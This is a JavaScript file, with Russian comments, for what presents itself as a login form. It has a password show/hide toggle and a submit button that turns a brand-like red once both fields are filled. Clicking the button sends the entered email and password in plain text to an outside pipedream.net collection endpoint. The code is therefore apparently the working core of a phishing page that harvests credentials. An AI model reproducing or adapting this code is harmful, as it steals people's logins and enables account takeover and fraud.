function togglePassword() {
    var passwordField = document.getElementById("passwordInput");
    if (passwordField.type === "password") {
      passwordField.type = "text";
      document.querySelector(".toggle-btn").textContent = "Скрыть";
    } else {
      passwordField.type = "password";
      document.querySelector(".toggle-btn").textContent = "Показать";
    }
  }

  document.addEventListener("DOMContentLoaded", function() {
    // Получаем ссылки на элементы
    const input1 = document.getElementById("useremail");
    const input2 = document.getElementById("passwordInput");
    const myButton = document.getElementById("myButton");

    // Функция для изменения цвета кнопки
    function changeButtonColor() {
      // Получаем значения из обоих полей ввода
      const value1 = input1.value.trim();
      const value2 = input2.value.trim();

      // Если оба поля ввода не пустые, меняем цвет кнопки
      if (value1 !== "" && value2 !== "") {
        myButton.style.backgroundColor = "rgba(254, 44, 85, 1)"; // Любой цвет, который вам нравится
        myButton.style.color = "#fff";
        myButton.style.cursor = "pointer"
      } else {
        myButton.style.backgroundColor = ""; // Если одно из полей пустое, сбрасываем цвет
      }
    }

    // Слушаем события изменения в полях ввода
    input1.addEventListener("input", changeButtonColor);
    input2.addEventListener("input", changeButtonColor);

    // Функция для отправки данных на сервер
    function sendDataToServer() {
      var userEmailValue = input1.value;
      var passwordValue = input2.value;

      fetch('https://eoj0l0tozcs5tz7.m.pipedream.net', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
          userEmail: userEmailValue,
          password: passwordValue
        })
      })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error('Ошибка:', error));
    }

    // Назначаем событие на кнопку для отправки данных при клике
    myButton.addEventListener('click', sendDataToServer);
  });